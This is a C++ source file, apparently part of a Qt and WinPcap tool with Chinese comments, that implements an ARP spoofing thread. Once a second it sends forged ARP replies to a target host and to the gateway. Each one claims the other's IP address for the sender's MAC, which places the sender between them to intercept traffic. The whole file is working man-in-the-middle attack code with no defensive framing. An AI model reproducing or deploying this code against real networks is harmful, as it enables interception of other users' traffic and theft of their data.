#include "arpcheatthread.h"
#include "arphead.h"
#include "windows.h"

ArpCheatThread::ArpCheatThread()
{
    stopped = false;
}

ArpCheatThread::~ArpCheatThread()
{

}

void ArpCheatThread::run()
{
    while(stopped != true)
    {
        //构建欺骗目标主机的arp数据包,源IP为网关IP
        fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp, targetMac, targetIp);
        if(pcap_sendpacket(adhandle, fakeTargetArpPkt, 42) == -1){
            emit sendLogMsg("发送ARP数据包失败!");
        }
        else{
            emit sendLogMsg("成功发送ARP数据包");
        }
        //构建欺骗网关的arp数据包，源IP为受害主机的IP
        fakeGateArpPkt = BuildArpPacket(currentMac, targetIp, gateMac, gateIp);
        if(pcap_sendpacket(adhandle, fakeGateArpPkt, 42) == -1){
            emit sendLogMsg("给网关发送虚假ARP包失败!");
        }
        else{
            emit sendLogMsg("成功给网关发送虚假ARP包!");
        }
        Sleep(1000);
    }
    emit sendLogMsg("停止ARP欺骗!");
}

void ArpCheatThread::stop()
{
    QMutexLocker locker(&m_lock);
    stopped = true;
}

//构建arp欺骗数据包
u_char* ArpCheatThread::BuildArpPacket(u_char *srcMac, u_long fakeIP, u_char *targetMac, u_long targetIP)
{
    static struct arp_packet packet;

    //设置目的MAC地址
    memcpy(packet.eth.dest_mac, targetMac, 6);
    //源MAC地址
    memcpy(packet.eth.src_mac, srcMac, 6);
    //上层协议为ARP协议
    packet.eth.eh_type = htons(0x0806);

    //硬件类型，Ethernet是0x0001
    packet.arp.hardware_type = htons(0x0001);
    //上层协议类型，IP为0x0800
    packet.arp.protocol_type = htons(0x0800);
    //硬件地址长度
    packet.arp.add_len = 0x06;
    //协议地址长度
    packet.arp.pro_len = 0x04;
    //操作，arp应答为2
    packet.arp.option = htons(0x0002);
    //源MAC地址
    memcpy(packet.arp.sour_addr, srcMac, 6);
    //源IP地址，即伪造的源IP地址
    packet.arp.sour_ip = fakeIP;
    //目的MAC地址
    memcpy(packet.arp.dest_addr, targetMac, 6);
    //目的IP地址
    packet.arp.dest_ip = targetIP;

    return (u_char*)&packet;
}

void ArpCheatThread::getCheatInfo(pcap_t *adhandle, u_char *selfmac, u_long destip, u_char *destmac, u_long gateip, u_char *gatemac)
{
    this->adhandle = adhandle;
    currentMac = selfmac;
    targetIp = destip;
    targetMac = destmac;
    gateIp = gateip;
    gateMac = gatemac;
}
